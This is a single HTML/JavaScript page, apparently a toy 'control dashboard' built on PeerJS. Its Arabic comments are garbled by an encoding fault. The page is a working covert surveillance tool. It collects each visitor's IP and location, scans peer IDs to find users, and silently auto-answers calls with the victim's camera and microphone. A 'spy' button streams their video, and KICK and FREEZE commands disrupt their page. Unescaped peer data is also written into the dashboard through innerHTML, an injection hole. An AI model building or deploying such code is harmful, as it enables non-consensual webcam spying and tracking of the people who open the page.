<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Control Dashboard</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', monospace; margin: 0; padding: 0; }
        body { background: #0b0b0b; color: #00ff00; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }

        /* Ø§Ù„Ø´Ø±ÙŠØ· Ø§Ù„Ø¹Ù„ÙˆÙŠ */
        .server-header {
            background: #111; border-bottom: 2px solid #00ff00; padding: 15px;
            display: flex; justify-content: space-between; align-items: center;
            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.1);
        }
        .status-box { font-size: 0.9rem; color: #888; }
        .active-count { color: #fff; font-weight: bold; font-size: 1.2rem; }

        /* Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© */
        .main-container { display: flex; flex: 1; height: 100%; }

        /* Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¬Ø§Ù†Ø¨ÙŠØ© (Ø§Ù„Ø³ÙŠØ±ÙØ±) */
        .sidebar {
            width: 350px; background: #080808; border-left: 1px solid #333;
            display: flex; flex-direction: column; padding: 10px;
            overflow-y: auto;
        }

        .user-card {
            background: #1a1a1a; border: 1px solid #333; padding: 10px; margin-bottom: 8px;
            border-radius: 5px; transition: 0.3s; position: relative;
        }
        .user-card:hover { border-color: #00ff00; background: #222; }
        .user-card.active { border-color: #00ff00; box-shadow: 0 0 10px rgba(0,255,0,0.2); }
        
        .user-info { font-size: 0.8rem; color: #ccc; margin-bottom: 5px; }
        .user-info span { color: #00ff00; font-weight: bold; }
        
        .action-btns { display: flex; gap: 5px; margin-top: 5px; }
        .btn-mini {
            flex: 1; padding: 5px; border: none; cursor: pointer; font-size: 0.7rem; font-weight: bold; color: white;
        }
        .btn-kick { background: #800; }
        .btn-freeze { background: #008; }
        .btn-spy { background: #880; color: black; }

        /* Ù…Ù†Ø·Ù‚Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ */
        .video-area { flex: 1; position: relative; background: black; display: flex; justify-content: center; align-items: center; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .overlay-label { position: absolute; bottom: 20px; left: 20px; background: rgba(0,0,0,0.7); padding: 5px 10px; color: white; border-radius: 4px; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ */
        #loginOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 9999; display: flex; flex-direction: column;
            align-items: center; justify-content: center;
        }
        .login-box { border: 2px solid #00ff00; padding: 40px; text-align: center; border-radius: 10px; width: 90%; max-width: 400px; }
        .login-box input { width: 100%; padding: 10px; margin: 10px 0; background: #111; border: 1px solid #555; color: white; text-align: center; }
        .login-box button { width: 100%; padding: 10px; background: #004400; color: #00ff00; border: 1px solid #00ff00; cursor: pointer; font-weight: bold; }

        /* ØªØ£Ø«ÙŠØ±Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ© */
        body.frozen { pointer-events: none; opacity: 0.3; background: white; }
    </style>
</head>
<body>

    <!-- Ø´Ø§Ø´Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
    <div id="loginOverlay">
        <div class="login-box">
            <h2 style="margin-bottom:20px; color:#00ff00;">SERVER ACCESS</h2>
            <p style="color:#777; font-size:0.8rem;">YOUR ID (AUTO):</p>
            <h1 id="myIdDisplay" style="color:white; margin-bottom:20px;">...</h1>
            
            <div style="border-top:1px dashed #333; margin:20px 0; padding-top:20px;">
                <p style="color:yellow; font-size:0.9rem;">Choose Mode:</p>
                <button onclick="startUserMode()">ğŸ‘¤ ENTER AS USER</button>
                <br><br>
                <button onclick="startAdminMode()" style="background:#400; border-color:red; color:white;">ğŸ‘‘ ENTER AS ADMIN (SCANNER)</button>
            </div>
        </div>
    </div>

    <!-- Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… -->
    <div class="server-header">
        <div>
            <span style="font-weight:bold; font-size:1.2rem;">âš¡ CONTROL DASHBOARD</span>
            <span id="scanStatus" style="margin-right:20px; font-size:0.8rem; color:yellow; display:none;">SCANNING NETWORK...</span>
        </div>
        <div class="status-box">
            Connected Users: <span class="active-count" id="userCount">0</span>
        </div>
    </div>

    <div class="main-container">
        <!-- Ø§Ù„ÙÙŠØ¯ÙŠÙˆ -->
        <div class="video-area">
            <video id="remoteVideo" autoplay></video>
            <div class="overlay-label" id="videoLabel">WAITING FOR CONNECTION...</div>
            
            <!-- ÙÙŠØ¯ÙŠÙˆÙŠ Ø£Ù†Ø§ (ØµØºÙŠØ±) -->
            <div style="position:absolute; bottom:20px; right:20px; width:150px; height:100px; border:1px solid #333; background:#000;">
                <video id="localVideo" autoplay muted></video>
            </div>
        </div>

        <!-- Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…ØªØµÙ„ÙŠÙ† (Ù„Ø£Ø¯Ù…Ù† ÙÙ‚Ø·) -->
        <div class="sidebar" id="adminSidebar" style="display:none;">
            <h3 style="border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:10px;">ğŸ“¡ DETECTED USERS</h3>
            <div id="usersList">
                <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù‡Ù†Ø§ -->
            </div>
        </div>
    </div>

    <script>
        // === 1. ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù‡ÙˆÙŠØ© ===
        // Ù†Ø³ØªØ®Ø¯Ù… Ø£Ø±Ù‚Ø§Ù… ØµØºÙŠØ±Ø© (10-99) Ù„ØªØ³Ù‡ÙŠÙ„ Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„Ù†Ø§Ø³ ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ù…Ø«Ø§Ù„
        const myId = Math.floor(Math.random() * (99 - 10 + 1) + 10).toString();
        document.getElementById('myIdDisplay').innerText = myId;

        let peer = new Peer(myId);
        let conn, call, localStream;
        let detectedUsers = {}; // ØªØ®Ø²ÙŠÙ† Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ©
        let isAdmin = false;

        // === 2. Ø¬Ù„Ø¨ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ© (IP/Country) ===
        let myInfo = {
            id: myId,
            ip: 'Loading...',
            country: 'Unknown',
            device: navigator.platform
        };

        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                myInfo.ip = data.ip;
                myInfo.country = data.country_name;
                myInfo.city = data.city;
            }).catch(err => console.log("Adblocker blocked IP API"));

        // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
            localStream = stream;
            document.getElementById('localVideo').srcObject = stream;
        });

        // === 3. Ø§Ù„ØªØ¹Ø§Ù…Ù„ Ù…Ø¹ PeerJS ===
        peer.on('open', id => console.log('My ID:', id));

        // Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§ØªØµØ§Ù„ (ÙˆØ¶Ø¹ Ø§Ù„Ø¶Ø­ÙŠØ©)
        peer.on('connection', c => {
            conn = c;
            // Ø¥Ø°Ø§ ÙƒÙ†Øª Ù…Ø³ØªØ®Ø¯Ù…Ø§Ù‹ Ø¹Ø§Ø¯ÙŠØ§Ù‹ØŒ Ø£Ø±Ø³Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙŠ Ù„Ù„Ø£Ø¯Ù…Ù† ÙÙˆØ±Ø§Ù‹
            if(!isAdmin) {
                conn.on('open', () => {
                    conn.send({ type: 'MY_INFO', data: myInfo });
                });
                setupDataListener();
            } else {
                // Ø¥Ø°Ø§ ÙƒÙ†Øª Ø£Ø¯Ù…Ù† ÙˆØ§ØªØµÙ„ Ø¨ÙŠ Ø£Ø­Ø¯
                handleAdminConnection(c);
            }
        });

        peer.on('call', incoming => {
            incoming.answer(localStream);
            call = incoming;
            call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
            document.getElementById('videoLabel').innerText = "CONNECTED WITH: " + incoming.peer;
        });

        // === 4. ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ø£Ø¯Ù…Ù† (Ø§Ù„Ø³ÙŠØ±ÙØ±) ===
        function startAdminMode() {
            isAdmin = true;
            document.getElementById('loginOverlay').style.display = 'none';
            document.getElementById('adminSidebar').style.display = 'flex';
            document.getElementById('scanStatus').style.display = 'inline';
            
            // Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø³Ø­ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
            startServerScanner();
        }

        function startUserMode() {
            isAdmin = false;
            document.getElementById('loginOverlay').style.display = 'none';
            // Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø¹Ø§Ø¯ÙŠ Ù„Ø§ ÙŠØ±Ù‰ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¬Ø§Ù†Ø¨ÙŠØ©
        }

        // === 5. Ø§Ù„Ø±Ø§Ø¯Ø§Ø± (SCANNER BOT) ===
        // Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù‡Ùˆ "Ø§Ù„Ø³ÙŠØ±ÙØ±" Ø§Ù„Ø°ÙŠ ÙŠØ¨Ø­Ø« Ø¹Ù† Ø§Ù„Ù…ØªØµÙ„ÙŠÙ†
        let scanIndex = 10;
        
        function startServerScanner() {
            setInterval(() => {
                // Ù†ÙˆÙ‚Ù Ø§Ù„Ù…Ø³Ø­ Ø¥Ø°Ø§ ÙƒÙ†Ø§ Ù…ØªØµÙ„ÙŠÙ† Ø¨Ø´Ø®Øµ Ø­Ø§Ù„ÙŠØ§Ù‹
                if(conn && conn.open) return;

                if(scanIndex > 99) scanIndex = 10; // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¯ÙˆØ±Ø©
                let target = scanIndex.toString();

                if(target !== myId && !detectedUsers[target]) {
                    checkUser(target);
                }
                scanIndex++;
            }, 500); // Ø³Ø±Ø¹Ø© Ø§Ù„Ù…Ø³Ø­ (ÙƒÙ„ Ù†ØµÙ Ø«Ø§Ù†ÙŠØ© ÙŠØ¬Ø±Ø¨ Ø±Ù‚Ù…)
        }

        function checkUser(targetId) {
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§ØªØµØ§Ù„ Ø®ÙÙŠÙØ©
            let checkConn = peer.connect(targetId);
            
            checkConn.on('open', () => {
                // ÙˆØ¬Ø¯Ù†Ø§ Ù…Ø³ØªØ®Ø¯Ù…! Ù†Ø·Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§ØªÙ‡
                // Ù„Ø§ Ù†Ø¶ÙŠÙÙ‡ Ù„Ù„Ù‚Ø§Ø¦Ù…Ø© ÙÙˆØ±Ø§Ù‹ØŒ Ù†Ù†ØªØ¸Ø± Ø£Ù† ÙŠØ±Ø³Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙ‡
                checkConn.send("PING");
            });

            checkConn.on('data', data => {
                if(data.type === 'MY_INFO') {
                    // Ø§Ø³ØªÙ„Ù…Ù†Ø§ Ø¨ÙŠØ§Ù†Ø§Øª Ø­Ù‚ÙŠÙ‚ÙŠØ©!
                    addUserToDashboard(data.data);
                    checkConn.close(); // Ù†ØºÙ„Ù‚ Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø®ÙÙŠÙ Ù„Ù†ÙƒÙ…Ù„ Ø§Ù„Ù…Ø³Ø­
                }
            });

            // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¥Ø°Ø§ Ù„Ù… ÙŠØ±Ø¯
            setTimeout(() => { if(checkConn.open) checkConn.close(); }, 2000);
        }

        function handleAdminConnection(c) {
            c.on('data', data => {
                if(data.type === 'MY_INFO') {
                    addUserToDashboard(data.data);
                }
            });
        }

        // === 6. Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠ Ø§Ù„Ù„ÙˆØ­Ø© ===
        function addUserToDashboard(userInfo) {
            if(detectedUsers[userInfo.id]) return; // Ù…ÙˆØ¬ÙˆØ¯ Ù…Ø³Ø¨Ù‚Ø§Ù‹

            detectedUsers[userInfo.id] = userInfo;
            updateUserCount();

            let sidebar = document.getElementById('usersList');
            let card = document.createElement('div');
            card.className = 'user-card';
            card.id = 'user-' + userInfo.id;
            card.innerHTML = `
                <div class="user-info">ID: <span>${userInfo.id}</span></div>
                <div class="user-info">IP: ${userInfo.ip}</div>
                <div class="user-info">Loc: ${userInfo.country}</div>
                <div class="user-info">Dev: ${userInfo.device}</div>
                <div class="action-btns">
                    <button class="btn-mini btn-kick" onclick="sendCommand('${userInfo.id}', 'KICK')">KICK</button>
                    <button class="btn-mini btn-freeze" onclick="sendCommand('${userInfo.id}', 'FREEZE')">FREEZE</button>
                    <button class="btn-mini btn-spy" onclick="connectToUser('${userInfo.id}')">CONNECT</button>
                </div>
            `;
            sidebar.prepend(card);
        }

        function updateUserCount() {
            document.getElementById('userCount').innerText = Object.keys(detectedUsers).length;
        }

        // === 7. Ø§Ù„Ø§ØªØµØ§Ù„ ÙˆØ§Ù„ØªØ­ÙƒÙ… ===
        function connectToUser(id) {
            conn = peer.connect(id);
            conn.on('open', () => {
                call = peer.call(id, localStream);
                call.on('stream', rs => {
                    document.getElementById('remoteVideo').srcObject = rs;
                    document.getElementById('videoLabel').innerText = "LIVE: " + id;
                });
                
                // ØªØ¸Ù„ÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ù†Ø´Ø·
                document.querySelectorAll('.user-card').forEach(c => c.classList.remove('active'));
                document.getElementById('user-' + id).classList.add('active');
            });
        }

        function sendCommand(id, action) {
            // ÙŠØ¬Ø¨ Ø§Ù„Ø§ØªØµØ§Ù„ Ø³Ø±ÙŠØ¹Ø§Ù‹ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ù…Ø± Ø«Ù… Ø§Ù„Ø®Ø±ÙˆØ¬
            let cmdConn = peer.connect(id);
            cmdConn.on('open', () => {
                cmdConn.send({ type: 'CMD', action: action });
                setTimeout(() => cmdConn.close(), 500);
                alert(`Command ${action} sent to ${id}`);
                
                if(action === 'KICK') {
                    // Ø¥Ø²Ø§Ù„Ø© Ù…Ù† Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©
                    delete detectedUsers[id];
                    let el = document.getElementById('user-' + id);
                    if(el) el.remove();
                    updateUserCount();
                }
            });
        }

        // === 8. Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø£ÙˆØ§Ù…Ø± (Ø¬Ø§Ù†Ø¨ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…) ===
        function setupDataListener() {
            conn.on('data', data => {
                if(data === "PING") {
                    // Ø§Ù„Ø³ÙŠØ±ÙØ± ÙŠØªØ­Ù‚Ù‚ Ù…Ù†ÙŠØŒ Ø£Ø±Ø³Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙŠ
                    conn.send({ type: 'MY_INFO', data: myInfo });
                }
                if(data.type === 'CMD') {
                    executeCommand(data.action);
                }
            });
        }

        function executeCommand(action) {
            if(action === 'KICK') {
                document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%'>YOU HAVE BEEN KICKED BY SERVER</h1>";
                setTimeout(() => location.reload(), 2000);
            }
            if(action === 'FREEZE') {
                document.body.classList.add('frozen');
                alert("SYSTEM FREEZE INITIATED");
            }
        }

    </script>
</body>
</html>
